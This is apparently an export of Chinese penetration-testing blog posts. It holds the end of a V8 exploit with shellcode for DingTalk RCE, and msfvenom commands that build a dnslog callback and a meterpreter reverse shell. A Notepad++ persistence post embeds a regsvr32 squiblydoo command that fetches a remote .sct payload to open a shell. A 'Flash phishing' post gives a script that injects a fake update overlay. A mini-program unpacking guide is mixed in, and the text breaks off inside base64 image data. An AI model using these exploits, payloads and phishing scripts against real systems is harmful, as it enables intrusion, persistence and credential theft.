wasm_instance_addr=get_32(export_function_data_addr+0x8)-0x1;print(_0x1368('0x1c','p]KF')+hex(wasm_instance_addr));var rwx_addr=get_32(wasm_instance_addr+0x40);print(_0x1368('0x3f','M*(X')+hex(rwx_addr));var shellcode=new Uint8Array([0x89,0xe5,0x83,0xec,0x20,0x31,0xdb,0x64,0x8b,0x5b,0x30,0x8b,0x5b,0xc,0x8b,0x5b,0x1c,0x8b,0x1b,0x8b,0x1b,0x8b,0x43,0x8,0x89,0x45,0xfc,0x8b,0x58,0x3c,0x1,0xc3,0x8b,0x5b,0x78,0x1,0xc3,0x8b,0x7b,0x20,0x1,0xc7,0x89,0x7d,0xf8,0x8b,0x4b,0x24,0x1,0xc1,0x89,0x4d,0xf4,0x8b,0x53,0x1c,0x1,0xc2,0x89,0x55,0xf0,0x8b,0x53,0x14,0x89,0x55,0xec,0xeb,0x32,0x31,0xc0,0x8b,0x55,0xec,0x8b,0x7d,0xf8,0x8b,0x75,0x18,0x31,0xc9,0xfc,0x8b,0x3c,0x87,0x3,0x7d,0xfc,0x66,0x83,0xc1,0x8,0xf3,0xa6,0x74,0x5,0x40,0x39,0xd0,0x72,0xe4,0x8b,0x4d,0xf4,0x8b,0x55,0xf0,0x66,0x8b,0x4,0x41,0x8b,0x4,0x82,0x3,0x45,0xfc,0xc3,0xba,0x78,0x78,0x65,0x63,0xc1,0xea,0x8,0x52,0x68,0x57,0x69,0x6e,0x45,0x89,0x65,0x18,0xe8,0xb8,0xff,0xff,0xff,0x31,0xc9,0x51,0x68,0x2e,0x65,0x78,0x65,0x68,0x63,0x61,0x6c,0x63,0x89,0xe3,0x41,0x51,0x53,0xff,0xd0,0x31,0xc9,0xb9,0x1,0x65,0x73,0x73,0xc1,0xe9,0x8,0x51,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0x89,0x65,0x18,0xe8,0x87,0xff,0xff,0xff,0x31,0xd2,0x52,0xff,0xd0]);for(let i=0x0;i&lt;shellcode[_0x1368('0x21','h0rH')];i++)set_8(rwx_addr+i,shellcode[i]);func(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 安装旧版本一段时间会自动升级，导致显示内存错误 修改shellcode msfvenom -a x86 –platform windows -p windows/exec cmd=&quot;curl kaili.erojuu.dnslog.cn&quot; -e x86/alpha_mixed -f csharp msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.36.130 LPORT=8834 -e x86/shikata_ga_nai -f csharp 后记 用的去年的chrome v8 引擎漏洞 ","link":"https://liangyueliangyue.github.io/post/dingtalk-rce-fu-xian/"},{"title":"微信小程序渗透学习","content":"微信小程序 小程序测试流程 分为两个方面，解包可以挖掘信息泄露问题、隐藏的接口，抓包可以测试一些逻辑漏洞、API安全问题。两者结合起来就可以边调试边进行测试，更方便于安全测试。 搜索目标小程序 目标搜索不能仅仅局限于主体单位，支撑单位、供应商、全资子公司等都可能是入口点，所以小程序当然也不能放过它们。 小程序主体信息确认 查看小程序账号主体信息，否则打偏了花费了时间不说，还可能有法律风险。点击小程序，点更多资料就能看到小程序相关信息 小程序包获取 PC端 首先在微信中搜索到小程序，并打开简单浏览 然后在自己微信文件保存路径下找到applet下找到该小程序包，可以通过时间或者小程序的appid快速定位到目标包 微信电脑端小程序包存在加密，需要使用工具进行解密下载地址 https://share.weiyun.com/uMqNGOXv 至于位置在微信文件夹Applet下 移动端 找到对应目录，把包拉出来即可 安卓保存路径：/data/data/com.tencent.mm/MicroMsg/{⽤户ID}/appbrand/pkg/ iOS保存路径：/var/mobile/Containers/Data/Application/{程序 UUID}/Library/WechatPrivate/{⽤户ID}/WeApp/LocalCache/release/{⼩程序ID}/ ） 由于安卓data目录需要root权限访问，所以需要手机或模拟器root android模拟器获取小程序包流程 这里我用到的是夜神模拟器，登录微信，找到小程序 方法是将复制的内容放到mnt-&gt;shared-&gt;orther下，就会自动同步到PC端，这是模拟器的共享目录 解包 工具地址 https://github.com/xuedingmiaojun/wxappUnpacker kali安装npm apt-get update apt install npm 环境安装 npm install uglify-es --save npm install esprima --save npm install css-tree --save npm install cssbeautify --save npm install vm2 --save npm install js-beautify --save npm install escodegen --save npm install cheerio --save 执行node wuWxapkg.js xxxxxx.wxapkg node wuWxapkg.js wx6693076a088ea68e.wxapkg 调试 打开微信开发者工具，选择导入项目,即可调试 后记 因为解包获取到的都是静态资源，所以小程序更多的是进行敏感信息的测试（例如对js文件中的接口进行渗透测试） ","link":"https://liangyueliangyue.github.io/post/wei-xin-xiao-cheng-xu-shen-tou-xue-xi/"},{"title":"权限维持之notepad++","content":"notepad++插件 Notepad++ 插件可用于扩展 Notepad++ 的功能。默认情况下，用户可以在 Notepad++ 中下载已批准的插件列表，但也允许自定义插件，无需任何验证，从而为开发人员提供扩展文本编辑器使用的灵活性。插件具有 DLL 文件的形式，并存储在以下路径中： %PROGRAMFILES%\\Notepad++\\plugins 应该注意的是，为了加载插件，文件夹和 DLL 需要具有相同的名称。 如： 对于红队操作员来说，不需要从头开始编写恶意插件，当在 notepad++ 中输入字符时， SCI_ADDTEXT API 将触发自定义命令。在以下示例中，在插入字符期间将出现一个消息框。 git clone https://github.com/npp-plugins/plugintemplate.git 项目提供了visual studio的项目文件vs.proj/NppPluginTemplate.vcxproj，直接双击打开，重定向项目的窗口记得选择确定。 然后就可以开始愉快的写代码了。模板中提示较为完善，根据提示首先打开PluginDefinition.h，可以自定义插件的名称和功能数量。 这里名字随便起，不重要。由于我们没什么真正需要实现的功能，这里可以不改，模板默认带两个测试功能（不能为0)，随便填一个功能。然后打开PluginDefinition.cpp，commandMenuInit函数中是用来设置功能和菜单栏中对应按钮的，模板中默认就带了两个测试功能也可以不改。真正需要实现的持久化功能可以填写在pluginInit方法中，notepad++打开会自动加载这些dll，然后调用pluginInit等函数。例如这里添加一个MessageBox。 void pluginInit(HANDLE /*hModule*/) { MessageBox(NULL, TEXT(&quot;test&quot;), TEXT(&quot;test&quot;), NULL); } 编译后生成NppPluginTemplate.dll文件。在notepad++的plugins目录下新建一个目录用来放这个dll，假如给这个目录起名为SecTest，则将NppPluginTemplate.dll文件拖到SecTest目录下并重命名为SecTest.dll即可（名字要一致，否则不加载），重启notepad++即可生效。 开启成功弹窗 权限维持需要使用regsrv32.exe绕过应用程序白名单 0x00 regsvr简介 regsvr32表示Microsoft注册服务。它是Windows的命令行实用工具。虽然regsvr32有时会导致问题出现，但它是Windows系统文件中的一个重要文件。该文件位于C:\\Windows的子文件夹中。该文件能够被查看，跟踪和影响其他程序。它主要用于在Windows文件扩展名中注册和取消注册程序，因为它是.exe，它的进程广泛地应用到OLE（对象链接和嵌入）、DLL（数据链接库）和OCX（ActiveX控制模块）中。上述进程在后台运行，可以通过任务管理器看到。它是微软的可信文件之一。 0x01 regsvr运行 当你通过regsvr32中注册一个dll文件时，有关与regsvr32关联的程序的信息将会被添加到Windows中。然后访问这些进程查看器以了解程序数据的位置以及如何与程序数据进行交互。在注册一个dll文件时，会将信息添加到目录中，以便Windows可以使用它。这些文件的整个路径在字面上都有可执行代码，因此Windows可以调用特定的函数。这些文件非常方便，因为当软件更新时，这些文件会自动调用更新的版本；简而言之，它有助于避免软件的版本问题。通常，除了注册和注销dll文件外，此文件不常用 RegSvr32.exe具有以下命令行选项： 语法： Regsvr32 [/s][/u] [/n] [/i[:cmdline]] / u - 取消注册server / i - 调用DllInstall传递一个可选的[cmdline]; 当它与/u一起使用时，调用dll uninstall / n - 不要调用DllRegisterServer; 此选项必须与/i一起使用 / s - Silent；不显示消息框 0x02 攻击regsvr的多种方法 Web delivery Empire Manual MSFVenom Koadic JSRat GreatSCT Web Delivery 该模块可以快速启动一个为payload提供服务的Web服务器。提供的命令将允许下载和执行payload。它将通过指定的脚本语言解析器或Regsvr32使用squiblydoo技术绕过应用程序白名单。此模块的主要目的是当攻击者必须手动输入命令（例如命令注入）时，快速在目标计算机上建立会话:例如命令注入。 Regsvr32使用squiblydoo技术绕过应用程序白名单。签名的Microsoft二进制文件Regsvr32能够运行**.sct**文件，然后在其中执行包含PowerShell命令。两个Web请求（即.sct文件和PowerShell下载/执行）都可以在同一端口上执行。“PSH（Binary）”会将文件写入到硬盘中，允许自定义二进制文件被下载和执行。 use exploit/multi/script/web_delivery set target 3 set payload windows/x64/meterpreter/reverse_tcp set LHOST 10.0.0.3 set LPORT 4444 run 一旦该exploit被执行，您将拥有一个为您创建的URL。在受害者pc的命令提示符中运行该URL，如下所示： regsvr32 /s /n /u /i:http://192.168.159.132:8080/c7jRfbZFWR2T.sct scrobj.dll 现在是用C去执行该语句 void pluginInit(HANDLE /*hModule*/) { WinExec(&quot;regsvr32 /s /n /u /i:http://192.168.159.132:8080/c7jRfbZFWR2T.sct scrobj.dll&quot;, SW_SHOW); } 即可实现调用notepad++即可拿到shell 后记 这里只进行了简单测试，因为是直接调用DLL，所以可以进行免杀 但前提必须是拥有文件上传的权限，所以用来做权限维持即可 这是一种思路，说明其他的可拓展的软件也都可能会有权限维持的利用空间 ","link":"https://liangyueliangyue.github.io/post/quan-xian-wei-chi-zhi-notepad/"},{"title":"Flash钓鱼","content":"Flash钓鱼 首先将写好的flash.js放在自己的服务器上 var s1 = document.createElement('script'); s1.setAttribute('type','text/javascript'); s1.setAttribute('src','//cdn.bootcdn.net/ajax/libs/jquery/2.0.0/jquery.min.js'); var head = document.getElementsByTagName('head')[0]; head.appendChild(s1); s1.onload = function(){ var s2 = document.createElement('script'); s2.setAttribute('type','text/javascript'); s2.setAttribute('src','//cdn.bootcdn.net/ajax/libs/layer/3.1.1/layer.js'); head.appendChild(s2); } var s3 = document.createElement('link'); s3.setAttribute('type','text/css'); s3.setAttribute('rel','stylesheet'); s3.setAttribute('href','//cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css'); head.appendChild(s3); var content = &quot;&lt;style&gt;*{margin:0;padding:0}#flash{width:613px;height:324px}#head{width:100%;height:66px;background-image:url('data:image/png;base64,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